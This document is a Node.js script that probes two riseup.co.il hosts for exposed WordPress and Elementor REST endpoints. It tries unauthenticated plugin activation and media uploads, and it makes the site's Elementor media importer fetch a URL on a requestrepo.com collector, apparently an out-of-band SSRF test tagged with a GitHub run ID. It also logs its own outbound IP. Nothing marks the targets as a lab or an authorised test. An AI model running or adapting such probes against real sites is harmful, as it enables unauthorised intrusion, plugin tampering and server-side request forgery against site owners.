const UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/140 Safari/537.36';
const hosts=['https://signup.riseup.co.il','https://www.riseup.co.il'];
const paths=[
  '/wp-json/elementor/v1/onboarding/install-pro',
  '/wp-json/elementor/v1/onboarding/install-theme',
  '/wp-json/elementor-one/v1/plugins',
  '/wp-json/wp/v2/plugins',
  '/wp-json/elementor/v1/documents/9756/media/import',
  '/wp-json/wp/v2/media'
];
async function req(host,path,method='GET',body) {
  try {
    const opt={method,redirect:'manual',headers:{'user-agent':UA,'accept':'application/json'}};
    if(body!==undefined){opt.headers['content-type']='application/json';opt.body=JSON.stringify(body)}
    const r=await fetch(host+path,opt), t=await r.text();
    console.log('RES',JSON.stringify({host,path,method,status:r.status,allow:r.headers.get('allow'),ct:r.headers.get('content-type'),body:t.slice(0,1200)}));
  } catch(e){console.log('ERR',JSON.stringify({host,path,method,error:String(e),cause:String(e?.cause||'')}))}
}
console.log('LAB_IP',await fetch('https://api.ipify.org').then(r=>r.text()).catch(e=>'ERR:'+e));
for(const host of hosts){
  try{
    const r=await fetch(host+'/wp-json/',{headers:{'user-agent':UA,'accept':'application/json'}}),j=await r.json();
    const routes={};
    for(const [k,v] of Object.entries(j.routes||{})) if(paths.includes('/wp-json'+k)) routes[k]=v;
    console.log('ROOT',JSON.stringify({host,status:r.status,name:j.name,namespaces:j.namespaces,routes}));
  }catch(e){console.log('ROOTERR',host,String(e),String(e?.cause||''))}
  for(const p of paths){await req(host,p,'OPTIONS');await req(host,p,'GET')}
  await req(host,'/wp-json/elementor-one/v1/plugins','POST',{slug:'elementor',status:'active'});
  await req(host,'/wp-json/wp/v2/media','POST',{});
  await req(host,'/wp-json/elementor/v1/documents/9756/media/import','POST',{url:'https://7xqvfwha.requestrepo.com/wp-media-probe-'+(process.env.GITHUB_RUN_ID||'x')+'.png'});
}
